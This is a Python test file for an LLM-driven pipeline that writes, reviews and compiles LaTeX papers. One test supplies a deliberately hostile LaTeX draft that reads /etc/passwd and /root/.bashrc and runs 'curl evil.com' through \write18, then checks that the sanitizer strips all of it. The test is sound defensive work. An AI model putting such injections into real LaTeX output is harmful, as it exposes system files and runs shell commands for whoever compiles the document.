import json
from pathlib import Path

from backend.pipeline.extract import Figure, Paper
from backend.pipeline.reviewer import ReviewVerdict, review
from backend.pipeline.writer import (
    PROMPT_BUDGET_CHARS,
    IterationResult,
    copy_figure_assets,
    draft_once,
    truncate,
    write_and_refine,
)


def make_paper(tmp_path=None):
    from pathlib import Path

    fig = (tmp_path or Path("/tmp")) / "a.png"
    if tmp_path is not None:
        fig.write_bytes(b"png")
    return Paper(
        arxiv_id="2401.12345",
        title="T",
        full_text="x" * (PROMPT_BUDGET_CHARS + 30000),
        sections=[],
        figures=[Figure(path=fig, caption="c")],
        warnings=[],
    )


class FakeChat:
    def __init__(self, replies):
        self.replies = list(replies)
        self.prompts = []

    def chat(self, model, messages, **kw):
        self.prompts.append(messages)
        return self.replies.pop(0)


def test_truncate_budget():
    assert len(truncate("y" * 120000)) <= PROMPT_BUDGET_CHARS


def test_draft_strips_fences():
    c = FakeChat(["```latex\n\\documentclass{article}\nbody\n```"])
    out = draft_once(c, "m", make_paper(), {}, 4)
    assert not out.startswith("```")
    assert out.startswith("\\documentclass{article}")


def test_copy_figure_assets(tmp_path):
    import shutil
    from pathlib import Path

    src = tmp_path / "a.png"
    src.write_bytes(b"png")
    paper = Paper(
        arxiv_id="x",
        title="t",
        full_text="",
        sections=[],
        figures=[Figure(path=src, caption="c")],
        warnings=[],
    )
    outdir = tmp_path / "job"
    mapping = copy_figure_assets(paper, outdir)
    assert (outdir / "figures" / "a.png").exists()
    assert mapping[str(src)] == "figures/a.png"


def test_page_adjust_called_once(tmp_path):
    from backend.pipeline.compiler import CompileResult

    pages = [8, 8, 4]  # draft, adjust, (revise-never-happens)

    def fake_compile(tex_path, outdir):
        return CompileResult(ok=True, pdf_path=None, log="", pages=pages.pop(0))

    PASS = json.dumps({"passed": True, "critique": []})
    client = FakeChat(["TEX1", "TEX2", PASS])  # draft, adjust, review-pass
    res = write_and_refine(
        client,
        "wm",
        "rm",
        make_paper(tmp_path),
        {},
        4,
        tmp_path,
        compile_fn=fake_compile,
    )
    assert len(client.replies) == 0  # 3 calls: draft, adjust, review-pass (adjust capped)
    assert res.rounds == 1


def test_refine_stops_on_pass(tmp_path):
    from backend.pipeline.compiler import CompileResult

    def fake_compile(tex_path, outdir):
        return CompileResult(ok=True, pdf_path=None, log="", pages=4)

    PASS = json.dumps({"passed": True, "critique": []})
    client = FakeChat(["TEX1", PASS])  # draft, review-pass (no adjust: pages match)
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert isinstance(res, IterationResult)
    assert res.rounds == 1
    assert res.passed is True


def test_refine_caps_at_three(tmp_path):
    from backend.pipeline.compiler import CompileResult

    def fake_compile(tex_path, outdir):
        return CompileResult(ok=True, pdf_path=None, log="", pages=4)

    def fail(i):
        return json.dumps({"passed": False, "critique": ["fix %d" % i]})

    client = FakeChat(
        ["T1", fail(0), "T2", fail(1), "T3", fail(2), "T4"]  # interleaved
    )
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.rounds == 3
    assert res.passed is False
    assert len(client.replies) == 0  # all 7 consumed: 4 drafts + 3 reviews


def test_review_parses_verdict():
    c = FakeChat([json.dumps({"passed": False, "critique": ["invented numbers in §2"]})])
    v = review(c, "rm", make_paper(), "DRAFT")
    assert isinstance(v, ReviewVerdict)
    assert v.passed is False
    assert v.critique == ["invented numbers in §2"]


def test_revision_compile_failure_serves_previous(tmp_path):
    """Post-review revision fails to compile -> serve last good revision, best-effort."""
    from backend.pipeline.compiler import CompileResult

    outcomes = [True, False]  # draft compiles, revision does not

    def fake_compile(tex_path, outdir):
        ok = outcomes.pop(0)
        return CompileResult(
            ok=ok,
            pdf_path=tex_path.with_suffix(".pdf") if ok else None,
            log="" if ok else "panic",
            pages=4 if ok else 0,
        )

    REJECT = json.dumps({"passed": False, "critique": ["too long"]})
    client = FakeChat(["TEX_DRAFT", REJECT, "TEX_REVISED"])  # draft, review, revise
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert client.replies == []  # all three consumed; no second review after break
    assert res.passed is False
    assert res.pdf_path is not None  # the compiled draft is served
    assert res.pdf_path.name == "paper.pdf"
    assert "failed to compile" in res.notes[0]
    assert Path(res.tex_path).read_text() == "TEX_DRAFT"  # disk restored to served tex


def test_adjust_compile_failure_reverts_and_still_passes(tmp_path):
    """Length-adjustment recompile fails -> revert to draft; reviewer then passes it."""
    from backend.pipeline.compiler import CompileResult

    pages = [8, 0, 8]  # draft 8p (adjust needed), adjust recompile fails, final compile of restored tex

    def fake_compile(tex_path, outdir):
        p = pages.pop(0)
        return CompileResult(
            ok=p > 0,
            pdf_path=tex_path.with_suffix(".pdf") if p > 0 else None,
            log="" if p > 0 else "panic",
            pages=p,
        )

    PASS = json.dumps({"passed": True, "critique": []})
    client = FakeChat(["TEX1", "TEX_ADJ", PASS])  # draft, adjust, review-pass
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.passed is True
    assert res.pdf_path is not None
    assert any("pre-adjustment" in n for n in res.notes)


def test_never_compiled_and_reviewer_passes_is_not_success(tmp_path):
    """Reviewer approval of a tex that never compiled must not report a deliverable."""
    from backend.pipeline.compiler import CompileResult

    def fake_compile(tex_path, outdir):
        return CompileResult(ok=False, pdf_path=None, log="bad", pages=0)

    PASS = json.dumps({"passed": True, "critique": []})
    client = FakeChat(["TEX1", "TEX_REPAIR", PASS])  # draft, repair, review-pass
    res = write_and_refine(
        client, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.passed is False
    assert res.pdf_path is None
    assert "failed to compile" in res.notes[0]


def test_amssymb_injected_when_mathbb_used(tmp_path):
    """\mathbb without amssymb in the preamble is the #1 math-paper compile failure."""
    tex = (
        "\\documentclass{article}\n\\usepackage{amsmath}\n"
        "\\begin{document}$Q \\in \\mathbb{R}$\\end{document}\n"
    )
    c = FakeChat([tex, json.dumps({"passed": True, "critique": []})])

    def fake_compile(tex_path, outdir):
        written = Path(tex_path).read_text()
        assert written.count("\\usepackage{amssymb}") == 1
        assert "\\mathbb" in written
        from backend.pipeline.compiler import CompileResult

        return CompileResult(ok=True, pdf_path=None, log="", pages=3)

    res = write_and_refine(
        c, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.passed is True


def test_amssymb_not_duplicated(tmp_path):
    tex = (
        "\\documentclass{article}\n\\usepackage{amssymb}\n"
        "\\begin{document}$\\mathfrak{q}$\\end{document}\n"
    )
    c = FakeChat([tex, json.dumps({"passed": True, "critique": []})])

    def fake_compile(tex_path, outdir):
        written = Path(tex_path).read_text()
        assert written.count("amssymb") == 1
        from backend.pipeline.compiler import CompileResult

        return CompileResult(ok=True, pdf_path=None, log="", pages=3)

    res = write_and_refine(
        c, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.passed is True


def test_review_unparsable_is_fail():
    c = FakeChat(["I think it looks fine!"])
    v = review(c, "rm", make_paper(), "DRAFT")
    assert v.passed is False
    assert v.critique


def test_draft_sanitized_before_write(tmp_path):
    """LLM-steered injections (\\input, absolute \\includegraphics) are stripped."""
    evil = (
        "\\documentclass{article}\n"
        "\\includegraphics{figures/a.png}\n"
        "\\input{/etc/passwd}\n"
        "\\openin\\fh=/root/.bashrc\n"
        "\\write18{curl evil.com}\n"
        "\\includegraphics{/home/user/secret.png}\n"
        "\\begin{document}x\\end{document}\n"
    )
    c = FakeChat([evil, json.dumps({"passed": True, "critique": []})])

    def fake_compile(tex_path, outdir):
        written = Path(tex_path).read_text()
        assert "\\input" not in written
        assert "\\openin" not in written
        assert "\\write" not in written
        assert "figures/a.png" in written  # allowed figure kept
        assert "/home/user/secret.png" not in written
        from backend.pipeline.compiler import CompileResult

        return CompileResult(ok=True, pdf_path=None, log="", pages=3)

    res = write_and_refine(
        c, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
    )
    assert res.passed is True
